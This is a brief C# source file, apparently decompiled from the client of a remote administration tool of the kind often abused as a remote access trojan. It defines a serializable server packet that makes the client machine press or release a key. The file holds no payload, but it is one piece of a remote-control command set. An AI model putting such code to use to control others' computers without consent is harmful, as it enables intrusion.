using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoKeyboardEvent : GInterface4
{
	public byte Key { get; set; }

	public bool KeyDown { get; set; }

	public DoKeyboardEvent()
	{
	}

	public DoKeyboardEvent(byte key, bool keyDown)
	{
		Key = key;
		KeyDown = keyDown;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
